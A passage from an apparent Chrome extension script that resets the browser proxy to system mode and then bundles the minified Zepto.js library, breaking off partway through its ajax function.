var needShowWarming = !1;
chrome.proxy.settings.set({
    value: {
        mode: "system"
    },
    scope: "regular"
},
function() {
    console.info("- proxy system! - ")
});
var Zepto = function() {
    var t, e, n, r, o, i, a = [],
    u = a.slice,
    c = a.filter,
    s = window.document,
    l = {},
    f = {},
    p = {
        "column-count": 1,
        columns: 1,
        "font-weight": 1,
        "line-height": 1,
        opacity: 1,
        "z-index": 1,
        zoom: 1
    },
    h = /^\s*<(\w+|!)[^>]*>/,
    d = /^<(\w+)\s*\/?>(?:<\/\1>|)$/,
    g = /<(?!area|br|col|embed|hr|img|input|link|meta|param)(([\w:]+)[^>]*)\/>/gi,
    v = /^(?:body|html)$/i,
    m = /([A-Z])/g,
    y = ["val", "css", "html", "text", "data", "width", "height", "offset"],
    w = s.createElement("table"),
    b = s.createElement("tr"),
    x = {
        tr: s.createElement("tbody"),
        tbody: w,
        thead: w,
        tfoot: w,
        td: b,
        th: b,
        "*": s.createElement("div")
    },
    S = /complete|loaded|interactive/,
    E = /^[\w-]*$/,
    T = {},
    j = T.toString,
    O = {},
    C = s.createElement("div"),
    A = {
        tabindex: "tabIndex",
        readonly: "readOnly",
        for: "htmlFor",
        class: "className",
        maxlength: "maxLength",
        cellspacing: "cellSpacing",
        cellpadding: "cellPadding",
        rowspan: "rowSpan",
        colspan: "colSpan",
        usemap: "useMap",
        frameborder: "frameBorder",
        contenteditable: "contentEditable"
    },
    D = Array.isArray ||
    function(t) {
        return t instanceof Array
    };
    function N(t) {
        return null == t ? String(t) : T[j.call(t)] || "object"
    }
    function _(t) {
        return "function" == N(t)
    }
    function k(t) {
        return null != t && t == t.window
    }
    function P(t) {
        return null != t && t.nodeType == t.DOCUMENT_NODE
    }
    function R(t) {
        return "object" == N(t)
    }
    function I(t) {
        return R(t) && !k(t) && Object.getPrototypeOf(t) == Object.prototype
    }
    function F(t) {
        return "number" == typeof t.length
    }
    function B(t) {
        return t.replace(/::/g, "/").replace(/([A-Z]+)([A-Z][a-z])/g, "$1_$2").replace(/([a-z\d])([A-Z])/g, "$1_$2").replace(/_/g, "-").toLowerCase()
    }
    function M(t) {
        return t in f ? f[t] : f[t] = new RegExp("(^|\\s)" + t + "(\\s|$)")
    }
    function q(t, e) {
        return "number" != typeof e || p[B(t)] ? e: e + "px"
    }
    function L(t) {
        return "children" in t ? u.call(t.children) : n.map(t.childNodes,
        function(t) {
            if (1 == t.nodeType) return t
        })
    }
    function U(t, e) {
        return null == e ? n(t) : n(t).filter(e)
    }
    function G(t, e, n, r) {
        return _(e) ? e.call(t, n, r) : e
    }
    function Z(t, e, n) {
        null == n ? t.removeAttribute(e) : t.setAttribute(e, n)
    }
    function $(e, n) {
        var r = e.className || "",
        o = r && r.baseVal !== t;
        if (n === t) return o ? r.baseVal: r;
        o ? r.baseVal = n: e.className = n
    }
    function z(t) {
        try {
            return t ? "true" == t || "false" != t && ("null" == t ? null: +t + "" == t ? +t: /^[\[\{]/.test(t) ? n.parseJSON(t) : t) : t
        } catch(e) {
            return t
        }
    }
    return O.matches = function(t, e) {
        if (!e || !t || 1 !== t.nodeType) return ! 1;
        var n = t.webkitMatchesSelector || t.mozMatchesSelector || t.oMatchesSelector || t.matchesSelector;
        if (n) return n.call(t, e);
        var r, o = t.parentNode,
        i = !o;
        return i && (o = C).appendChild(t),
        r = ~O.qsa(o, e).indexOf(t),
        i && C.removeChild(t),
        r
    },
    o = function(t) {
        return t.replace(/-+(.)?/g,
        function(t, e) {
            return e ? e.toUpperCase() : ""
        })
    },
    i = function(t) {
        return c.call(t,
        function(e, n) {
            return t.indexOf(e) == n
        })
    },
    O.fragment = function(e, r, o) {
        var i, a, c;
        return d.test(e) && (i = n(s.createElement(RegExp.$1))),
        i || (e.replace && (e = e.replace(g, "<$1></$2>")), r === t && (r = h.test(e) && RegExp.$1), r in x || (r = "*"), (c = x[r]).innerHTML = "" + e, i = n.each(u.call(c.childNodes),
        function() {
            c.removeChild(this)
        })),
        I(o) && (a = n(i), n.each(o,
        function(t, e) {
            y.indexOf(t) > -1 ? a[t](e) : a.attr(t, e)
        })),
        i
    },
    O.Z = function(t, e) {
        return (t = t || []).__proto__ = n.fn,
        t.selector = e || "",
        t
    },
    O.isZ = function(t) {
        return t instanceof O.Z
    },
    O.init = function(e, r) {
        var o, i;
        if (!e) return O.Z();
        if ("string" == typeof e) if ("<" == (e = e.trim())[0] && h.test(e)) o = O.fragment(e, RegExp.$1, r),
        e = null;
        else {
            if (r !== t) return n(r).find(e);
            o = O.qsa(s, e)
        } else {
            if (_(e)) return n(s).ready(e);
            if (O.isZ(e)) return e;
            if (D(e)) i = e,
            o = c.call(i,
            function(t) {
                return null != t
            });
            else if (R(e)) o = [e],
            e = null;
            else if (h.test(e)) o = O.fragment(e.trim(), RegExp.$1, r),
            e = null;
            else {
                if (r !== t) return n(r).find(e);
                o = O.qsa(s, e)
            }
        }
        return O.Z(o, e)
    },
    (n = function(t, e) {
        return O.init(t, e)
    }).extend = function(n) {
        var r, o = u.call(arguments, 1);
        return "boolean" == typeof n && (r = n, n = o.shift()),
        o.forEach(function(o) { !
            function n(r, o, i) {
                for (e in o) i && (I(o[e]) || D(o[e])) ? (I(o[e]) && !I(r[e]) && (r[e] = {}), D(o[e]) && !D(r[e]) && (r[e] = []), n(r[e], o[e], i)) : o[e] !== t && (r[e] = o[e])
            } (n, o, r)
        }),
        n
    },
    O.qsa = function(t, e) {
        var n, r = "#" == e[0],
        o = !r && "." == e[0],
        i = r || o ? e.slice(1) : e,
        a = E.test(i);
        return P(t) && a && r ? (n = t.getElementById(i)) ? [n] : [] : 1 !== t.nodeType && 9 !== t.nodeType ? [] : u.call(a && !r ? o ? t.getElementsByClassName(i) : t.getElementsByTagName(e) : t.querySelectorAll(e))
    },
    n.contains = s.documentElement.contains ?
    function(t, e) {
        return t !== e && t.contains(e)
    }: function(t, e) {
        for (; e && (e = e.parentNode);) if (e === t) return ! 0;
        return ! 1
    },
    n.type = N,
    n.isFunction = _,
    n.isWindow = k,
    n.isArray = D,
    n.isPlainObject = I,
    n.isEmptyObject = function(t) {
        var e;
        for (e in t) return ! 1;
        return ! 0
    },
    n.inArray = function(t, e, n) {
        return a.indexOf.call(e, t, n)
    },
    n.camelCase = o,
    n.trim = function(t) {
        return null == t ? "": String.prototype.trim.call(t)
    },
    n.uuid = 0,
    n.support = {},
    n.expr = {},
    n.map = function(t, e) {
        var r, o, i, a, u = [];
        if (F(t)) for (o = 0; o < t.length; o++) null != (r = e(t[o], o)) && u.push(r);
        else for (i in t) null != (r = e(t[i], i)) && u.push(r);
        return (a = u).length > 0 ? n.fn.concat.apply([], a) : a
    },
    n.each = function(t, e) {
        var n, r;
        if (F(t)) {
            for (n = 0; n < t.length; n++) if (!1 === e.call(t[n], n, t[n])) return t
        } else for (r in t) if (!1 === e.call(t[r], r, t[r])) return t;
        return t
    },
    n.grep = function(t, e) {
        return c.call(t, e)
    },
    window.JSON && (n.parseJSON = JSON.parse),
    n.each("Boolean Number String Function Array Date RegExp Object Error".split(" "),
    function(t, e) {
        T["[object " + e + "]"] = e.toLowerCase()
    }),
    n.fn = {
        forEach: a.forEach,
        reduce: a.reduce,
        push: a.push,
        sort: a.sort,
        indexOf: a.indexOf,
        concat: a.concat,
        map: function(t) {
            return n(n.map(this,
            function(e, n) {
                return t.call(e, n, e)
            }))
        },
        slice: function() {
            return n(u.apply(this, arguments))
        },
        ready: function(t) {
            return S.test(s.readyState) && s.body ? t(n) : s.addEventListener("DOMContentLoaded",
            function() {
                t(n)
            },
            !1),
            this
        },
        get: function(e) {
            return e === t ? u.call(this) : this[e >= 0 ? e: e + this.length]
        },
        toArray: function() {
            return this.get()
        },
        size: function() {
            return this.length
        },
        remove: function() {
            return this.each(function() {
                null != this.parentNode && this.parentNode.removeChild(this)
            })
        },
        each: function(t) {
            return a.every.call(this,
            function(e, n) {
                return ! 1 !== t.call(e, n, e)
            }),
            this
        },
        filter: function(t) {
            return _(t) ? this.not(this.not(t)) : n(c.call(this,
            function(e) {
                return O.matches(e, t)
            }))
        },
        add: function(t, e) {
            return n(i(this.concat(n(t, e))))
        },
        is: function(t) {
            return this.length > 0 && O.matches(this[0], t)
        },
        not: function(e) {
            var r = [];
            if (_(e) && e.call !== t) this.each(function(t) {
                e.call(this, t) || r.push(this)
            });
            else {
                var o = "string" == typeof e ? this.filter(e) : F(e) && _(e.item) ? u.call(e) : n(e);
                this.forEach(function(t) {
                    o.indexOf(t) < 0 && r.push(t)
                })
            }
            return n(r)
        },
        has: function(t) {
            return this.filter(function() {
                return R(t) ? n.contains(this, t) : n(this).find(t).size()
            })
        },
        eq: function(t) {
            return - 1 === t ? this.slice(t) : this.slice(t, +t + 1)
        },
        first: function() {
            var t = this[0];
            return t && !R(t) ? t: n(t)
        },
        last: function() {
            var t = this[this.length - 1];
            return t && !R(t) ? t: n(t)
        },
        find: function(t) {
            var e = this;
            return t ? "object" == typeof t ? n(t).filter(function() {
                var t = this;
                return a.some.call(e,
                function(e) {
                    return n.contains(e, t)
                })
            }) : 1 == this.length ? n(O.qsa(this[0], t)) : this.map(function() {
                return O.qsa(this, t)
            }) : n()
        },
        closest: function(t, e) {
            var r = this[0],
            o = !1;
            for ("object" == typeof t && (o = n(t)); r && !(o ? o.indexOf(r) >= 0 : O.matches(r, t));) r = r !== e && !P(r) && r.parentNode;
            return n(r)
        },
        parents: function(t) {
            for (var e = [], r = this; r.length > 0;) r = n.map(r,
            function(t) {
                if ((t = t.parentNode) && !P(t) && e.indexOf(t) < 0) return e.push(t),
                t
            });
            return U(e, t)
        },
        parent: function(t) {
            return U(i(this.pluck("parentNode")), t)
        },
        children: function(t) {
            return U(this.map(function() {
                return L(this)
            }), t)
        },
        contents: function() {
            return this.map(function() {
                return u.call(this.childNodes)
            })
        },
        siblings: function(t) {
            return U(this.map(function(t, e) {
                return c.call(L(e.parentNode),
                function(t) {
                    return t !== e
                })
            }), t)
        },
        empty: function() {
            return this.each(function() {
                this.innerHTML = ""
            })
        },
        pluck: function(t) {
            return n.map(this,
            function(e) {
                return e[t]
            })
        },
        show: function() {
            return this.each(function() {
                var t, e, n;
                "none" == this.style.display && (this.style.display = ""),
                "none" == getComputedStyle(this, "").getPropertyValue("display") && (this.style.display = (t = this.nodeName, l[t] || (e = s.createElement(t), s.body.appendChild(e), n = getComputedStyle(e, "").getPropertyValue("display"), e.parentNode.removeChild(e), "none" == n && (n = "block"), l[t] = n), l[t]))
            })
        },
        replaceWith: function(t) {
            return this.before(t).remove()
        },
        wrap: function(t) {
            var e = _(t);
            if (this[0] && !e) var r = n(t).get(0),
            o = r.parentNode || this.length > 1;
            return this.each(function(i) {
                n(this).wrapAll(e ? t.call(this, i) : o ? r.cloneNode(!0) : r)
            })
        },
        wrapAll: function(t) {
            if (this[0]) {
                var e;
                for (n(this[0]).before(t = n(t)); (e = t.children()).length;) t = e.first();
                n(t).append(this)
            }
            return this
        },
        wrapInner: function(t) {
            var e = _(t);
            return this.each(function(r) {
                var o = n(this),
                i = o.contents(),
                a = e ? t.call(this, r) : t;
                i.length ? i.wrapAll(a) : o.append(a)
            })
        },
        unwrap: function() {
            return this.parent().each(function() {
                n(this).replaceWith(n(this).children())
            }),
            this
        },
        clone: function() {
            return this.map(function() {
                return this.cloneNode(!0)
            })
        },
        hide: function() {
            return this.css("display", "none")
        },
        toggle: function(e) {
            return this.each(function() {
                var r = n(this); (e === t ? "none" == r.css("display") : e) ? r.show() : r.hide()
            })
        },
        prev: function(t) {
            return n(this.pluck("previousElementSibling")).filter(t || "*")
        },
        next: function(t) {
            return n(this.pluck("nextElementSibling")).filter(t || "*")
        },
        html: function(t) {
            return 0 in arguments ? this.each(function(e) {
                var r = this.innerHTML;
                n(this).empty().append(G(this, t, e, r))
            }) : 0 in this ? this[0].innerHTML: null
        },
        text: function(t) {
            return 0 in arguments ? this.each(function(e) {
                var n = G(this, t, e, this.textContent);
                this.textContent = null == n ? "": "" + n
            }) : 0 in this ? this[0].textContent: null
        },
        attr: function(n, r) {
            var o;
            return "string" != typeof n || 1 in arguments ? this.each(function(t) {
                if (1 === this.nodeType) if (R(n)) for (e in n) Z(this, e, n[e]);
                else Z(this, n, G(this, r, t, this.getAttribute(n)))
            }) : this.length && 1 === this[0].nodeType ? !(o = this[0].getAttribute(n)) && n in this[0] ? this[0][n] : o: t
        },
        removeAttr: function(t) {
            return this.each(function() {
                1 === this.nodeType && t.split(" ").forEach(function(t) {
                    Z(this, t)
                },
                this)
            })
        },
        prop: function(t, e) {
            return t = A[t] || t,
            1 in arguments ? this.each(function(n) {
                this[t] = G(this, e, n, this[t])
            }) : this[0] && this[0][t]
        },
        data: function(e, n) {
            var r = "data-" + e.replace(m, "-$1").toLowerCase(),
            o = 1 in arguments ? this.attr(r, n) : this.attr(r);
            return null !== o ? z(o) : t
        },
        val: function(t) {
            return 0 in arguments ? this.each(function(e) {
                this.value = G(this, t, e, this.value)
            }) : this[0] && (this[0].multiple ? n(this[0]).find("option").filter(function() {
                return this.selected
            }).pluck("value") : this[0].value)
        },
        offset: function(t) {
            if (t) return this.each(function(e) {
                var r = n(this),
                o = G(this, t, e, r.offset()),
                i = r.offsetParent().offset(),
                a = {
                    top: o.top - i.top,
                    left: o.left - i.left
                };
                "static" == r.css("position") && (a.position = "relative"),
                r.css(a)
            });
            if (!this.length) return null;
            var e = this[0].getBoundingClientRect();
            return {
                left: e.left + window.pageXOffset,
                top: e.top + window.pageYOffset,
                width: Math.round(e.width),
                height: Math.round(e.height)
            }
        },
        css: function(t, r) {
            if (arguments.length < 2) {
                var i, a = this[0];
                if (!a) return;
                if (i = getComputedStyle(a, ""), "string" == typeof t) return a.style[o(t)] || i.getPropertyValue(t);
                if (D(t)) {
                    var u = {};
                    return n.each(t,
                    function(t, e) {
                        u[e] = a.style[o(e)] || i.getPropertyValue(e)
                    }),
                    u
                }
            }
            var c = "";
            if ("string" == N(t)) r || 0 === r ? c = B(t) + ":" + q(t, r) : this.each(function() {
                this.style.removeProperty(B(t))
            });
            else for (e in t) t[e] || 0 === t[e] ? c += B(e) + ":" + q(e, t[e]) + ";": this.each(function() {
                this.style.removeProperty(B(e))
            });
            return this.each(function() {
                this.style.cssText += ";" + c
            })
        },
        index: function(t) {
            return t ? this.indexOf(n(t)[0]) : this.parent().children().indexOf(this[0])
        },
        hasClass: function(t) {
            return !! t && a.some.call(this,
            function(t) {
                return this.test($(t))
            },
            M(t))
        },
        addClass: function(t) {
            return t ? this.each(function(e) {
                if ("className" in this) {
                    r = [];
                    var o = $(this);
                    G(this, t, e, o).split(/\s+/g).forEach(function(t) {
                        n(this).hasClass(t) || r.push(t)
                    },
                    this),
                    r.length && $(this, o + (o ? " ": "") + r.join(" "))
                }
            }) : this
        },
        removeClass: function(e) {
            return this.each(function(n) {
                if ("className" in this) {
                    if (e === t) return $(this, "");
                    r = $(this),
                    G(this, e, n, r).split(/\s+/g).forEach(function(t) {
                        r = r.replace(M(t), " ")
                    }),
                    $(this, r.trim())
                }
            })
        },
        toggleClass: function(e, r) {
            return e ? this.each(function(o) {
                var i = n(this);
                G(this, e, o, $(this)).split(/\s+/g).forEach(function(e) { (r === t ? !i.hasClass(e) : r) ? i.addClass(e) : i.removeClass(e)
                })
            }) : this
        },
        scrollTop: function(e) {
            if (this.length) {
                var n = "scrollTop" in this[0];
                return e === t ? n ? this[0].scrollTop: this[0].pageYOffset: this.each(n ?
                function() {
                    this.scrollTop = e
                }: function() {
                    this.scrollTo(this.scrollX, e)
                })
            }
        },
        scrollLeft: function(e) {
            if (this.length) {
                var n = "scrollLeft" in this[0];
                return e === t ? n ? this[0].scrollLeft: this[0].pageXOffset: this.each(n ?
                function() {
                    this.scrollLeft = e
                }: function() {
                    this.scrollTo(e, this.scrollY)
                })
            }
        },
        position: function() {
            if (this.length) {
                var t = this[0],
                e = this.offsetParent(),
                r = this.offset(),
                o = v.test(e[0].nodeName) ? {
                    top: 0,
                    left: 0
                }: e.offset();
                return r.top -= parseFloat(n(t).css("margin-top")) || 0,
                r.left -= parseFloat(n(t).css("margin-left")) || 0,
                o.top += parseFloat(n(e[0]).css("border-top-width")) || 0,
                o.left += parseFloat(n(e[0]).css("border-left-width")) || 0,
                {
                    top: r.top - o.top,
                    left: r.left - o.left
                }
            }
        },
        offsetParent: function() {
            return this.map(function() {
                for (var t = this.offsetParent || s.body; t && !v.test(t.nodeName) && "static" == n(t).css("position");) t = t.offsetParent;
                return t
            })
        }
    },
    n.fn.detach = n.fn.remove,
    ["width", "height"].forEach(function(e) {
        var r = e.replace(/./,
        function(t) {
            return t[0].toUpperCase()
        });
        n.fn[e] = function(o) {
            var i, a = this[0];
            return o === t ? k(a) ? a["inner" + r] : P(a) ? a.documentElement["scroll" + r] : (i = this.offset()) && i[e] : this.each(function(t) { (a = n(this)).css(e, G(this, o, t, a[e]()))
            })
        }
    }),
    ["after", "prepend", "before", "append"].forEach(function(t, e) {
        var r = e % 2;
        n.fn[t] = function() {
            var t, o, i = n.map(arguments,
            function(e) {
                return "object" == (t = N(e)) || "array" == t || null == e ? e: O.fragment(e)
            }),
            a = this.length > 1;
            return i.length < 1 ? this: this.each(function(t, u) {
                o = r ? u: u.parentNode,
                u = 0 == e ? u.nextSibling: 1 == e ? u.firstChild: 2 == e ? u: null;
                var c = n.contains(s.documentElement, o);
                i.forEach(function(t) {
                    if (a) t = t.cloneNode(!0);
                    else if (!o) return n(t).remove();
                    o.insertBefore(t, u),
                    c &&
                    function t(e, n) {
                        n(e);
                        for (var r = 0,
                        o = e.childNodes.length; r < o; r++) t(e.childNodes[r], n)
                    } (t,
                    function(t) {
                        null == t.nodeName || "SCRIPT" !== t.nodeName.toUpperCase() || t.type && "text/javascript" !== t.type || t.src || window.eval.call(window, t.innerHTML)
                    })
                })
            })
        },
        n.fn[r ? t + "To": "insert" + (e ? "Before": "After")] = function(e) {
            return n(e)[t](this),
            this
        }
    }),
    O.Z.prototype = n.fn,
    O.uniq = i,
    O.deserializeValue = z,
    n.zepto = O,
    n
} ();
window.Zepto = Zepto,
void 0 === window.$ && (window.$ = Zepto),
function(t) {
    var e, n = 1,
    r = Array.prototype.slice,
    o = t.isFunction,
    i = function(t) {
        return "string" == typeof t
    },
    a = {},
    u = {},
    c = "onfocusin" in window,
    s = {
        focus: "focusin",
        blur: "focusout"
    },
    l = {
        mouseenter: "mouseover",
        mouseleave: "mouseout"
    };
    function f(t) {
        return t._zid || (t._zid = n++)
    }
    function p(t, e, n, r) {
        if ((e = h(e)).ns) var o = (i = e.ns, new RegExp("(?:^| )" + i.replace(" ", " .* ?") + "(?: |$)"));
        var i;
        return (a[f(t)] || []).filter(function(t) {
            return t && (!e.e || t.e == e.e) && (!e.ns || o.test(t.ns)) && (!n || f(t.fn) === f(n)) && (!r || t.sel == r)
        })
    }
    function h(t) {
        var e = ("" + t).split(".");
        return {
            e: e[0],
            ns: e.slice(1).sort().join(" ")
        }
    }
    function d(t, e) {
        return t.del && !c && t.e in s || !!e
    }
    function g(t) {
        return l[t] || c && s[t] || t
    }
    function v(n, r, o, i, u, c, s) {
        var p = f(n),
        v = a[p] || (a[p] = []);
        r.split(/\s/).forEach(function(r) {
            if ("ready" == r) return t(document).ready(o);
            var a = h(r);
            a.fn = o,
            a.sel = u,
            a.e in l && (o = function(e) {
                var n = e.relatedTarget;
                if (!n || n !== this && !t.contains(this, n)) return a.fn.apply(this, arguments)
            }),
            a.del = c;
            var f = c || o;
            a.proxy = function(t) {
                if (! (t = S(t)).isImmediatePropagationStopped()) {
                    t.data = i;
                    var r = f.apply(n, t._args == e ? [t] : [t].concat(t._args));
                    return ! 1 === r && (t.preventDefault(), t.stopPropagation()),
                    r
                }
            },
            a.i = v.length,
            v.push(a),
            "addEventListener" in n && n.addEventListener(g(a.e), a.proxy, d(a, s))
        })
    }
    function m(t, e, n, r, o) {
        var i = f(t); (e || "").split(/\s/).forEach(function(e) {
            p(t, e, n, r).forEach(function(e) {
                delete a[i][e.i],
                "removeEventListener" in t && t.removeEventListener(g(e.e), e.proxy, d(e, o))
            })
        })
    }
    u.click = u.mousedown = u.mouseup = u.mousemove = "MouseEvents",
    t.event = {
        add: v,
        remove: m
    },
    t.proxy = function(e, n) {
        var a = 2 in arguments && r.call(arguments, 2);
        if (o(e)) {
            var u = function() {
                return e.apply(n, a ? a.concat(r.call(arguments)) : arguments)
            };
            return u._zid = f(e),
            u
        }
        if (i(n)) return a ? (a.unshift(e[n], e), t.proxy.apply(null, a)) : t.proxy(e[n], e);
        throw new TypeError("expected function")
    },
    t.fn.bind = function(t, e, n) {
        return this.on(t, e, n)
    },
    t.fn.unbind = function(t, e) {
        return this.off(t, e)
    },
    t.fn.one = function(t, e, n, r) {
        return this.on(t, e, n, r, 1)
    };
    var y = function() {
        return ! 0
    },
    w = function() {
        return ! 1
    },
    b = /^([A-Z]|returnValue$|layer[XY]$)/,
    x = {
        preventDefault: "isDefaultPrevented",
        stopImmediatePropagation: "isImmediatePropagationStopped",
        stopPropagation: "isPropagationStopped"
    };
    function S(n, r) {
        return ! r && n.isDefaultPrevented || (r || (r = n), t.each(x,
        function(t, e) {
            var o = r[t];
            n[t] = function() {
                return this[e] = y,
                o && o.apply(r, arguments)
            },
            n[e] = w
        }), (r.defaultPrevented !== e ? r.defaultPrevented: "returnValue" in r ? !1 === r.returnValue: r.getPreventDefault && r.getPreventDefault()) && (n.isDefaultPrevented = y)),
        n
    }
    function E(t) {
        var n, r = {
            originalEvent: t
        };
        for (n in t) b.test(n) || t[n] === e || (r[n] = t[n]);
        return S(r, t)
    }
    t.fn.delegate = function(t, e, n) {
        return this.on(e, t, n)
    },
    t.fn.undelegate = function(t, e, n) {
        return this.off(e, t, n)
    },
    t.fn.live = function(e, n) {
        return t(document.body).delegate(this.selector, e, n),
        this
    },
    t.fn.die = function(e, n) {
        return t(document.body).undelegate(this.selector, e, n),
        this
    },
    t.fn.on = function(n, a, u, c, s) {
        var l, f, p = this;
        return n && !i(n) ? (t.each(n,
        function(t, e) {
            p.on(t, a, u, e, s)
        }), p) : (i(a) || o(c) || !1 === c || (c = u, u = a, a = e), (o(u) || !1 === u) && (c = u, u = e), !1 === c && (c = w), p.each(function(e, o) {
            s && (l = function(t) {
                return m(o, t.type, c),
                c.apply(this, arguments)
            }),
            a && (f = function(e) {
                var n, i = t(e.target).closest(a, o).get(0);
                if (i && i !== o) return n = t.extend(E(e), {
                    currentTarget: i,
                    liveFired: o
                }),
                (l || c).apply(i, [n].concat(r.call(arguments, 1)))
            }),
            v(o, n, c, u, a, f || l)
        }))
    },
    t.fn.off = function(n, r, a) {
        var u = this;
        return n && !i(n) ? (t.each(n,
        function(t, e) {
            u.off(t, r, e)
        }), u) : (i(r) || o(a) || !1 === a || (a = r, r = e), !1 === a && (a = w), u.each(function() {
            m(this, n, a, r)
        }))
    },
    t.fn.trigger = function(e, n) {
        return (e = i(e) || t.isPlainObject(e) ? t.Event(e) : S(e))._args = n,
        this.each(function() {
            e.type in s && "function" == typeof this[e.type] ? this[e.type]() : "dispatchEvent" in this ? this.dispatchEvent(e) : t(this).triggerHandler(e, n)
        })
    },
    t.fn.triggerHandler = function(e, n) {
        var r, o;
        return this.each(function(a, u) { (r = E(i(e) ? t.Event(e) : e))._args = n,
            r.target = u,
            t.each(p(u, e.type || e),
            function(t, e) {
                if (o = e.proxy(r), r.isImmediatePropagationStopped()) return ! 1
            })
        }),
        o
    },
    "focusin focusout focus blur load resize scroll unload click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select keydown keypress keyup error".split(" ").forEach(function(e) {
        t.fn[e] = function(t) {
            return 0 in arguments ? this.bind(e, t) : this.trigger(e)
        }
    }),
    t.Event = function(t, e) {
        i(t) || (t = (e = t).type);
        var n = document.createEvent(u[t] || "Events"),
        r = !0;
        if (e) for (var o in e)"bubbles" == o ? r = !!e[o] : n[o] = e[o];
        return n.initEvent(t, r, !0),
        S(n)
    }
} (Zepto),
function(t) {
    var e, n, r = 0,
    o = window.document,
    i = /<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi,
    a = /^(?:text|application)\/javascript/i,
    u = /^(?:text|application)\/xml/i,
    c = "application/json",
    s = "text/html",
    l = /^\s*$/,
    f = o.createElement("a");
    function p(e, n, r, i) {
        if (e.global) return function(e, n, r) {
            var o = t.Event(n);
            return t(e).trigger(o, r),
            !o.isDefaultPrevented()
        } (n || o, r, i)
    }
    function h(t, e) {
        var n = e.context;
        if (!1 === e.beforeSend.call(n, t, e) || !1 === p(e, n, "ajaxBeforeSend", [t, e])) return ! 1;
        p(e, n, "ajaxSend", [t, e])
    }
    function d(t, e, n, r) {
        var o = n.context;
        n.success.call(o, t, "success", e),
        r && r.resolveWith(o, [t, "success", e]),
        p(n, o, "ajaxSuccess", [e, n, t]),
        v("success", e, n)
    }
    function g(t, e, n, r, o) {
        var i = r.context;
        r.error.call(i, n, e, t),
        o && o.rejectWith(i, [n, e, t]),
        p(r, i, "ajaxError", [n, r, t || e]),
        v(e, n, r)
    }
    function v(e, n, r) {
        var o = r.context;
        r.complete.call(o, n, e),
        p(r, o, "ajaxComplete", [n, r]),
        function(e) {
            e.global && !--t.active && p(e, null, "ajaxStop")
        } (r)
    }
    function m() {}
    function y(t, e) {
        return "" == e ? t: (t + "&" + e).replace(/[&?]{1,2}/, "?")
    }
    function w(e, n, r, o) {
        return t.isFunction(n) && (o = r, r = n, n = void 0),
        t.isFunction(r) || (o = r, r = void 0),
        {
            url: e,
            data: n,
            success: r,
            dataType: o
        }
    }
    f.href = window.location.href,
    t.active = 0,
    t.ajaxJSONP = function(e, n) {
        if (! ("type" in e)) return t.ajax(e);
        var i, a, u = e.jsonpCallback,
        c = (t.isFunction(u) ? u() : u) || "jsonp" + ++r,
        s = o.createElement("script"),
        l = window[c],
        f = function(e) {
            t(s).triggerHandler("error", e || "abort")
        },
        p = {
            abort: f
        };
        return n && n.promise(p),
        t(s).on("load error",
        function(r, o) {
            clearTimeout(a),
            t(s).off().remove(),
            "error" != r.type && i ? d(i[0], p, e, n) : g(null, o || "error", p, e, n),
            window[c] = l,
            i && t.isFunction(l) && l(i[0]),
            l = i = void 0
        }),
        !1 === h(p, e) ? (f("abort"), p) : (window[c] = function() {
            i = arguments
        },
        s.src = e.url.replace(/\?(.+)=\?/, "?$1=" + c), o.head.appendChild(s), e.timeout > 0 && (a = setTimeout(function() {
            f("timeout")
        },
        e.timeout)), p)
    },
    t.ajaxSettings = {
        type: "GET",
        beforeSend: m,
        success: m,
        error: m,
        complete: m,
        context: null,
        global: !0,
        xhr: function() {
            return new window.XMLHttpRequest
        },
        accepts: {
            script: "text/javascript, application/javascript, application/x-javascript",
            json: c,
            xml: "application/xml, text/xml",
            html: s,
            text: "text/plain"
        },
        crossDomain: !1,
        timeout: 0,
        processData: !0,
        cache: !0
    },
    t.ajax = function(r) {
        var i, v = t.extend({},
        r || {}),
        w = t.Deferred && t.Deferred();
        for (e in t.ajaxSettings) void 0 === v[e] && (v[e] = t.ajaxSettings[e]); !
        function(e) {
            e.global && 0 == t.active++&&p(e, null, "ajaxStart")
        } (v),
        v.crossDomain || ((i = o.createElement("a")).href = v.url, i.href = i.href, v.crossDomain = f.protocol + "//" + f.host != i.protocol + "//" + i.host),
        v.url || (v.url = window.location.toString()),
        function(e) {
            e.processData && e.data && "string" != t.type(e.data) && (e.data = t.param(e.data, e.traditional)),
            !e.data || e.type && "GET" != e.type.toUpperCase() || (e.url = y(e.url, e.data), e.data = void 0)
        } (v);
        var b = v.dataType,
        x = /\?.+=\?/.test(v.url);
        if (x && (b = "jsonp"), !1 !== v.cache && (r && !0 === r.cache || "script" != b && "jsonp" != b) || (v.url = y(v.url, "_=" + Date.now())), "jsonp" == b) return x || (v.url = y(v.url, v.jsonp ? v.jsonp + "=?": !1 === v.jsonp ? "": "callback=?")),
        t.ajaxJSONP(v, w);
        var S, E = v.accepts[b],
        T = {},
        j = function(t, e) {
            T[t.toLowerCase()] = [t, e]
        },
        O = /^([\w-]+:)\/\//.test(v.url) ? RegExp.$1: window.location.protocol,
        C = v.xhr(),
        A = C.setRequestHeader;
        if (w && w.promise(C), v.crossDomain || j("X-Requested-With", "XMLHttpRequest"), j("Accept", E || "*/*"), (E = v.mimeType || E) && (E.indexOf(",") > -1 && (E = E.split(",", 2)[0]), C.overrideMimeType && C.overrideMimeType(E)), (v.contentType || !1 !== v.contentType && v.data && "GET" != v.type.toUpperCase()) && j("Content-Type", v.contentType || "application/x-www-form-urlencoded"), v.headers) for (n in v.headers) j(n, v.headers[n]);
        if (C.setRequestHeader = j, C.onreadystatechange = function() {
            if (4 == C.readyState) {
                C.onreadystatechange = m,
                clearTimeout(S);
                var e, n = !1;
                if (C.status >= 200 && C.status < 300 || 304 == C.status || 0 == C.status && "file:" == O) {
                    b = b || ((r = v.mimeType || C.getResponseHeader("content-type")) && (r = r.split(";", 2)[0]), r && (r == s ? "html": r == c ? "json": a.test(r) ? "script": u.test(r) && "xml") || "text"),
                    e = C.responseText;
                    try {
                        "script" == b ? (0, eval)(e) : "xml" == b ? e = C.responseXML: "json" == b && (e = l.test(e) ? null: t.parseJSON(e))
                    } catch(t) {
                        n = t
                    }
                    n ? g(n, "parsererror", C, v, w) : d(e, C, v, w)
                } else g(C.statusText || null, C.status ? "error": "abort", C, v, w)
            }
            var r
        }, !1 === h(C, v)) return C.abort(),
        g(null, "abort", C, v, w),
        C;
        if (v.xhrFields) for (n in v.xhrFields) C[n] = v.xhrFields[n];
        var D = !("async" in v) || v.async;
        for (n in C.open(v.type, v.url, D, v.username, v.password), T) A.apply(C, T[n]);
        return v.timeout > 0 && (S = setTimeout(function() {
